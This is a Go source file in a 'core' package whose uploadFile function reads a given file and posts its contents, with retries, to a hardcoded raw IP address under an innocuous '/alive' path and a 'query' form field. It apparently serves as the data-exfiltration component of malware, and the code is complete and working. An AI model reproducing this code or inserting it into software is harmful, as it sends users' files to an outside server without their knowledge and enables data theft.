package core

import (
	"bytes"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const uploadURL = "http://45.61.149.130/alive"

const (
	uploadRetries    = 3
	uploadTimeout    = 30 * time.Second
	uploadFieldName  = "query"
	uploadClientName = "bwdata"
)

func uploadFile(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	filename := filepath.Base(path)

	var lastErr error
	for attempt := 0; attempt < uploadRetries; attempt++ {
		if attempt > 0 {
			time.Sleep(time.Second)
		}
		var body bytes.Buffer
		w := multipart.NewWriter(&body)
		fw, err := w.CreateFormFile(uploadFieldName, filename)
		if err != nil {
			return err
		}
		if _, err := fw.Write(data); err != nil {
			return err
		}
		if err := w.Close(); err != nil {
			return err
		}

		req, err := http.NewRequest(http.MethodPost, uploadURL, &body)
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", w.FormDataContentType())

		client := &http.Client{Timeout: uploadTimeout}
		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			return nil
		}
		lastErr = &uploadStatusError{code: resp.StatusCode}
	}
	return lastErr
}

type uploadStatusError struct {
	code int
}

func (e *uploadStatusError) Error() string {
	return "upload status: " + http.StatusText(e.code)
}
